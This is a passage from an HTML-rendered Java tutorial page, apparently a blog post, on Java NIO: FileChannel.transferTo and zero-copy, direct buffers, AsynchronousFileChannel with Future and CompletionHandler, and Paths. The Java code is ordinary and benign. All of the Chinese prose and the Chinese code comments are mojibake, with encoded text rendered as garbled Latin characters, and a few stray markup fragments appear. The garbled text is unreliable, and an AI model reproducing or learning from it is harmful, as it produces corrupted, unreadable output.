class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>), StandardOpenOption.READ);</span><br><span class="line">      <span class="type">FileChannel</span> <span class="variable">destinationChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger3.txt&quot;</span>), StandardOpenOption.WRITE, StandardOpenOption.CREATE, StandardOpenOption.READ)) &#123;</span><br><span class="line">    sourceChannel.transferTo(<span class="number">0</span>, sourceChannel.size(), destinationChannel);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">&#125;</span><br><span class="line">``</span><br><span class="line">FileChannel çš„ transferTo() æ–¹æ³•æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„æ–‡ä»¶ä¼ è¾“æ–¹æ³•ï¼Œå®ƒå…è®¸å°†æ–‡ä»¶çš„ä¸€éƒ¨åˆ†æˆ–å…¨éƒ¨å†…å®¹ç›´æ¥ä»æºæ–‡ä»¶é€šé“ä¼ è¾“åˆ°ç›®æ ‡é€šé“ï¼ˆé€šå¸¸æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶é€šé“æˆ–ç½‘ç»œé€šé“ï¼‰ã€‚è¿™ç§ä¼ è¾“æ–¹å¼å¯ä»¥é¿å…å°†æ–‡ä»¶æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´è¿›è¡Œå¤šæ¬¡æ‹·è´ï¼Œæé«˜äº†æ–‡ä»¶ä¼ è¾“çš„æ€§èƒ½ã€‚</span><br><span class="line">éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒtransferTo() æ–¹æ³•å¯èƒ½æ— æ³•ä¸€æ¬¡ä¼ è¾“æ‰€æœ‰è¯·æ±‚çš„å­—èŠ‚ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œä½ å¯èƒ½éœ€è¦ä½¿ç”¨å¾ªç¯æ¥ç¡®ä¿æ‰€æœ‰å­—èŠ‚éƒ½è¢«ä¼ è¾“ã€‚</span><br><span class="line">```java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileChannelTransferToLoopExampleWithPaths</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">sourcePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="type">Path</span> <span class="variable">destinationPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding_copy.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨ try-with-resources è¯­å¥ç¡®ä¿é€šé“èµ„æºè¢«æ­£ç¡®å…³é—­</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">sourceChannel</span> <span class="operator">=</span> FileChannel.open(sourcePath, StandardOpenOption.READ);</span><br><span class="line">             <span class="type">FileChannel</span> <span class="variable">destinationChannel</span> <span class="operator">=</span> FileChannel.open(destinationPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">long</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> sourceChannel.size();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¾ªç¯ä¼ è¾“ï¼Œç›´åˆ°æ‰€æœ‰å­—èŠ‚éƒ½è¢«ä¼ è¾“</span></span><br><span class="line">            <span class="keyword">while</span> (position &lt; count) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">transferred</span> <span class="operator">=</span> sourceChannel.transferTo(position, count - position, destinationChannel);</span><br><span class="line">                position += transferred;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>æ­¤å¤–ï¼ŒtransferTo() æ–¹æ³•åœ¨åº•å±‚ä½¿ç”¨äº†æ“ä½œç³»ç»Ÿæä¾›çš„é›¶æ‹·è´åŠŸèƒ½ï¼ˆå¦‚ Linux çš„ sendfile() ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œå¯ä»¥å¤§å¹…æé«˜æ–‡ä»¶ä¼ è¾“æ€§èƒ½ã€‚ä½†æ˜¯ï¼Œä¸åŒæ“ä½œç³»ç»Ÿå’Œ JVM å®ç°å¯èƒ½ä¼šå½±å“é›¶æ‹·è´çš„å¯ç”¨æ€§å’Œæ€§èƒ½ï¼Œå› æ­¤å®é™…æ€§èƒ½å¯èƒ½å› ç¯å¢ƒè€Œå¼‚ã€‚<br>é›¶æ‹·è´ï¼ˆZero-Copyï¼‰æ˜¯ä¸€ç§ä¼˜åŒ–æ•°æ®ä¼ è¾“æ€§èƒ½çš„æŠ€æœ¯ï¼Œå®ƒæœ€å¤§é™åº¦åœ°å‡å°‘äº†åœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­çš„ CPU å’Œå†…å­˜å¼€é”€ã€‚åœ¨ä¼ ç»Ÿçš„æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œæ•°æ®é€šå¸¸éœ€è¦åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´è¿›è¡Œå¤šæ¬¡æ‹·è´ï¼Œè¿™ä¼šå¯¼è‡´é¢å¤–çš„ CPU å’Œå†…å­˜å¼€é”€ã€‚é›¶æ‹·è´æŠ€æœ¯é€šè¿‡é¿å…è¿™äº›å¤šä½™çš„æ‹·è´æ“ä½œï¼Œå®ç°äº†æ›´é«˜æ•ˆçš„æ•°æ®ä¼ è¾“ã€‚<br>åœ¨ Java ä¸­ï¼Œé›¶æ‹·è´æŠ€æœ¯ä¸»è¦åº”ç”¨äºæ–‡ä»¶å’Œç½‘ç»œ I&#x2F;Oã€‚FileChannel ç±»çš„ transferTo() å’Œ transferFrom() æ–¹æ³•å°±åˆ©ç”¨äº†é›¶æ‹·è´æŠ€æœ¯ï¼Œå¯ä»¥åœ¨æ–‡ä»¶å’Œç½‘ç»œé€šé“ä¹‹é—´é«˜æ•ˆåœ°ä¼ è¾“æ•°æ®ã€‚<a href="https://zhuanlan.zhihu.com/p/83398714">https://zhuanlan.zhihu.com/p/83398714</a></li></ol><h4 id="ç›´æ¥ä¸éç›´æ¥ç¼“å†²åŒº"><a href="#ç›´æ¥ä¸éç›´æ¥ç¼“å†²åŒº" class="headerlink" title="ç›´æ¥ä¸éç›´æ¥ç¼“å†²åŒº"></a>ç›´æ¥ä¸éç›´æ¥ç¼“å†²åŒº</h4><p>ç›´æ¥ç¼“å†²åŒºå’Œéç›´æ¥ç¼“å†²åŒºçš„å·®åˆ«ä¸»è¦åœ¨äºå®ƒä»¬åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼ã€‚è¿™é‡Œç»™å‡ºäº†ç›´æ¥ç¼“å†²åŒºå’Œéç›´æ¥ç¼“å†²åŒºçš„ç®€è¦æ¦‚è¿°å’ŒåŒºåˆ«ï¼š<br>éç›´æ¥ç¼“å†²åŒºï¼š</p><ul><li>åˆ†é…åœ¨ JVM å †å†…å­˜ä¸­</li><li>å—åˆ°åƒåœ¾å›æ”¶çš„ç®¡ç†</li><li>åœ¨è¯»å†™æ“ä½œæ—¶ï¼Œéœ€è¦å°†æ•°æ®ä»å †å†…å­˜å¤åˆ¶åˆ°æ“ä½œç³»ç»Ÿçš„æœ¬åœ°å†…å­˜ï¼Œå†è¿›è¡Œ I&#x2F;O æ“ä½œ</li><li>åˆ›å»ºï¼š ByteBuffer.allocate(int capacity)<br>ç›´æ¥ç¼“å†²åŒºï¼š</li><li>åˆ†é…åœ¨æ“ä½œç³»ç»Ÿçš„æœ¬åœ°å†…å­˜ä¸­</li><li>ä¸å—åƒåœ¾å›æ”¶çš„ç®¡ç†</li><li>åœ¨è¯»å†™æ“ä½œæ—¶ï¼Œç›´æ¥åœ¨æœ¬åœ°å†…å­˜ä¸­è¿›è¡Œï¼Œé¿å…äº†æ•°æ®å¤åˆ¶ï¼Œæé«˜äº†æ€§èƒ½</li><li>åˆ›å»ºï¼š ByteBuffer.allocateDirect(int capacity)</li><li>è¿˜æœ‰å‰é¢æåˆ°çš„ FileChannel.map() æ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªç±»å‹ä¸º MappedByteBuffer çš„ç›´æ¥ç¼“å†²åŒºã€‚<br><img src="/2024/11/04/code/javanio/image-7.png"><br>éç›´æ¥ç¼“å†²åŒºå­˜å‚¨åœ¨JVMå†…éƒ¨ï¼Œæ•°æ®éœ€è¦ä»åº”ç”¨ç¨‹åºï¼ˆJavaï¼‰å¤åˆ¶åˆ°éç›´æ¥ç¼“å†²åŒºï¼Œå†å¤åˆ¶åˆ°å†…æ ¸ç¼“å†²åŒºï¼Œæœ€åå‘é€åˆ°è®¾å¤‡ï¼ˆç£ç›˜&#x2F;ç½‘ç»œï¼‰ã€‚è€Œå¯¹äºç›´æ¥ç¼“å†²åŒºï¼Œæ•°æ®å¯ä»¥ç›´æ¥ä»åº”ç”¨ç¨‹åºï¼ˆJavaï¼‰å¤åˆ¶åˆ°å†…æ ¸ç¼“å†²åŒºï¼Œæ— éœ€ç»è¿‡JVMçš„éç›´æ¥ç¼“å†²åŒºã€‚</li></ul><h4 id="å¼‚æ­¥æ–‡ä»¶é€šé“-AsynchronousFileChannel"><a href="#å¼‚æ­¥æ–‡ä»¶é€šé“-AsynchronousFileChannel" class="headerlink" title="å¼‚æ­¥æ–‡ä»¶é€šé“ AsynchronousFileChannel"></a>å¼‚æ­¥æ–‡ä»¶é€šé“ AsynchronousFileChannel</h4><p>AsynchronousFileChannel æ˜¯ Java 7 å¼•å…¥çš„ä¸€ä¸ªå¼‚æ­¥æ–‡ä»¶é€šé“ç±»ï¼Œæä¾›äº†å¯¹æ–‡ä»¶çš„å¼‚æ­¥è¯»ã€å†™ã€æ‰“å¼€å’Œå…³é—­ç­‰æ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">file</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;example.txt&quot;</span>);</span><br><span class="line"><span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE);</span><br></pre></td></tr></table></figure><p>AsynchronousFileChannel æä¾›äº†ä¸¤ç§å¼‚æ­¥æ“ä½œçš„æ–¹å¼ï¼š</p><ol><li><p>Future æ–¹å¼ï¼šä½¿ç”¨ Future å¯¹è±¡æ¥è·Ÿè¸ªå¼‚æ­¥æ“ä½œçš„å®Œæˆæƒ…å†µã€‚å½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼ˆå¦‚ read() æˆ– write()ï¼‰æ—¶ï¼Œå®ƒä¼šç«‹å³è¿”å›ä¸€ä¸ª Future å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯¹è±¡æ¥æ£€æŸ¥æ“ä½œæ˜¯å¦å®Œæˆï¼Œä»¥åŠè·å–æ“ä½œçš„ç»“æœã€‚è¿™ç§æ–¹å¼é€‚ç”¨äºä¸éœ€è¦åœ¨æ“ä½œå®Œæˆæ—¶ç«‹å³æ‰§è¡Œå…¶ä»–æ“ä½œçš„åœºæ™¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">Future&lt;Integer&gt; result = fileChannel.read(buffer, position);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!result.isDone()) &#123;</span><br><span class="line">    <span class="comment">// æ‰§è¡Œå…¶ä»–æ“ä½œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> result.get();</span><br><span class="line">System.out.println(<span class="string">&quot;Bytes read: &quot;</span> + bytesRead);</span><br></pre></td></tr></table></figure></li><li><p>CompletionHandler æ–¹å¼ï¼Œä½¿ç”¨ä¸€ä¸ªå®ç°äº† CompletionHandler æ¥å£çš„å¯¹è±¡æ¥å¤„ç†å¼‚æ­¥æ“ä½œçš„å®Œæˆã€‚æˆ‘ä»¬éœ€è¦æä¾›ä¸€ä¸ª CompletionHandler å®ç°ç±»ï¼Œé‡å†™ completed() å’Œ failed() æ–¹æ³•ï¼Œåˆ†åˆ«å¤„ç†æ“ä½œæˆåŠŸå’Œæ“ä½œå¤±è´¥çš„æƒ…å†µã€‚å½“å¼‚æ­¥æ“ä½œå®Œæˆæ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ã€‚è¿™ç§æ–¹å¼é€‚ç”¨äºéœ€è¦åœ¨æ“ä½œå®Œæˆæ—¶ç«‹å³æ‰§è¡Œå…¶ä»–æ“ä½œçš„åœºæ™¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fileChannel.read(buffer, position, buffer, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer result, ByteBuffer attachment)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Bytes read: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Read failed&quot;</span>);</span><br><span class="line">        exc.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;docs/é…å¥—æ•™ç¨‹.md&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(path, StandardOpenOption.READ)) &#123;</span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">    <span class="type">long</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        Future&lt;Integer&gt; result = fileChannel.read(buffer, position);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!result.isDone()) &#123;</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œå¯ä»¥æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œä¾‹å¦‚å¤„ç†å…¶ä»– I/O æ“ä½œ</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> result.get();</span><br><span class="line">        <span class="keyword">if</span> (bytesRead &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        position += bytesRead;</span><br><span class="line">        buffer.flip();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.limit()];</span><br><span class="line">        buffer.get(data);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(data));</span><br><span class="line"></span><br><span class="line">        buffer.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ AsynchronousFileChannel.read() æ–¹æ³•å‘èµ·å¼‚æ­¥è¯»å–æ“ä½œã€‚è¿™ä¸ªæ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª Future<Integer> å¯¹è±¡ï¼Œè¡¨ç¤ºè¯»å–æ“ä½œçš„ç»“æœã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨ isDone() æ–¹æ³•æ¥æ£€æŸ¥å¼‚æ­¥æ“ä½œæ˜¯å¦å®Œæˆã€‚å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨ get() æ–¹æ³•è·å–å®é™…è¯»å–çš„å­—èŠ‚æ•°ã€‚<br>ç„¶åæˆ‘ä»¬æ¥çœ‹ CompletionHandler æ¥å£çš„å½¢å¼ï¼š</Integer></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">readAllBytes</span><span class="params">(Path path)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">    <span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(path, StandardOpenOption.READ);</span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">    <span class="type">AtomicLong</span> <span class="variable">position</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">CountDownLatch</span> <span class="variable">latch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    fileChannel.read(buffer, position.get(), <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, Object&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer bytesRead, Object attachment)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (bytesRead &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                position.addAndGet(bytesRead);</span><br><span class="line">                buffer.flip();</span><br><span class="line">                <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.limit()];</span><br><span class="line">                buffer.get(data);</span><br><span class="line">                System.out.print(<span class="keyword">new</span> <span class="title class_">String</span>(data));</span><br><span class="line">                buffer.clear();</span><br><span class="line"></span><br><span class="line">                fileChannel.read(buffer, position.get(), attachment, <span class="built_in">this</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                latch.countDown();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fileChannel.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, Object attachment)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + exc.getMessage());</span><br><span class="line">            latch.countDown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    latch.await();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Java-NIO-ä¸­çš„Paths-å’Œ-Files"><a href="#Java-NIO-ä¸­çš„Paths-å’Œ-Files" class="headerlink" title="Java NIO ä¸­çš„Paths å’Œ Files"></a>Java NIO ä¸­çš„Paths å’Œ Files</h2><p>Java NIOï¼ˆNew I&#x2F;Oï¼‰åº“å¼•å…¥äº†è®¸å¤šæ–°çš„åŠŸèƒ½ï¼Œå…¶ä¸­åŒ…æ‹¬ <code>Paths</code> å’Œ <code>Files</code> è¿™ä¸¤ä¸ªé‡è¦çš„ç±»ï¼Œå®ƒä»¬ä¸»è¦ç”¨äºæ–‡ä»¶å’Œç›®å½•çš„æ“ä½œï¼Œæä¾›äº†æ¯”ä¼ ç»Ÿçš„ <code>File</code> ç±»æ›´å¼ºå¤§å’Œçµæ´»çš„åŠŸèƒ½ã€‚</p><h3 id="1-Paths-ç±»"><a href="#1-Paths-ç±»" class="headerlink" title="1. Paths ç±»"></a>1. <code>Paths</code> ç±»</h3><p><code>Paths</code> ç±»ç”¨äºå®šä½æ–‡ä»¶ç³»ç»Ÿä¸­çš„è·¯å¾„ï¼Œæ˜¯ <code>java.nio.file.Path</code> çš„ä¾¿æ·å·¥å‚ç±»ã€‚<code>Paths</code> ç±»çš„é™æ€æ–¹æ³•å¯ä»¥å°†å­—ç¬¦ä¸²è·¯å¾„è½¬æ¢ä¸º <code>Path</code> å®ä¾‹ï¼Œä¾¿äºè¿›è¡Œè¿›ä¸€æ­¥çš„æ“ä½œã€‚</p><ul><li><p><strong>åˆ›å»º Path å¯¹è±¡</strong><br>ä½¿ç”¨ <code>Paths.get(String first, String... more)</code> æ–¹æ³•å¯ä»¥è½»æ¾åˆ›å»ºä¸€ä¸ª <code>Path</code> å®ä¾‹ã€‚è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¤šä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼ˆä»£è¡¨è·¯å¾„çš„å„ä¸ªéƒ¨åˆ†ï¼‰å¹¶è¿”å› <code>Path</code> å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;file.txt&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>è·å–è·¯å¾„ä¿¡æ¯</strong><br><code>Path</code> ç±»æä¾›äº†ä¸°å¯Œçš„è·¯å¾„ä¿¡æ¯æŸ¥è¯¢æ–¹æ³•ï¼Œå¦‚ï¼š</p><ul><li><code>getFileName()</code>: è·å–æ–‡ä»¶åã€‚</li><li><code>getParent()</code>: è·å–ä¸Šçº§ç›®å½•è·¯å¾„ã€‚</li><li><code>getRoot()</code>: è·å–æ ¹è·¯å¾„ã€‚</li><li><code>isAbsolute()</code>: æ£€æŸ¥è·¯å¾„æ˜¯å¦ä¸ºç»å¯¹è·¯å¾„ã€‚</li><li><code>toAbsolutePath()</code>: è½¬æ¢ä¸ºç»å¯¹è·¯å¾„ã€‚</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;docs/é…å¥—æ•™ç¨‹.md&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ–‡ä»¶å</span></span><br><span class="line">System.out.println(<span class="string">&quot;File name: &quot;</span> + path.getFileName());</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–çˆ¶ç›®å½•</span></span><br><span class="line">System.out.println(<span class="string">&quot;Parent: &quot;</span> + path.getParent());</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ ¹ç›®å½•</span></span><br><span class="line">System.out.println(<span class="string">&quot;Root: &quot;</span> + path.getRoot());</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†è·¯å¾„ä¸å¦ä¸€ä¸ªè·¯å¾„ç»“åˆ</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">newPath</span> <span class="operator">=</span> path.resolve(<span class="string">&quot;config/app.properties&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Resolved path: &quot;</span> + newPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç®€åŒ–è·¯å¾„</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">normalizedPath</span> <span class="operator">=</span> newPath.normalize();</span><br><span class="line">System.out.println(<span class="string">&quot;Normalized path: &quot;</span> + normalizedPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†ç›¸å¯¹è·¯å¾„è½¬æ¢ä¸ºç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">absolutePath</span> <span class="operator">=</span> path.toAbsolutePath();</span><br><span class="line">System.out.println(<span class="string">&quot;Absolute path: &quot;</span> + absolutePath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¡ç®—ä¸¤ä¸ªè·¯å¾„ä¹‹é—´çš„ç›¸å¯¹è·¯å¾„</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">basePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;/docs/&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">targetPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;/docs/imgs/itwanger&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">relativePath</span> <span class="operator">=</span> basePath.relativize(targetPath);</span><br><span class="line">System.out.println(<span class="string">&quot;Relative path: &quot;</span> + relativePath);</span><br></pre></td></tr></table></figure><h4 id="2-Files-ç±»"><a href="#2-Files-ç±»" class="headerlink" title="2. Files ç±»"></a>2. <code>Files</code> ç±»</h4><p><code>Files</code> 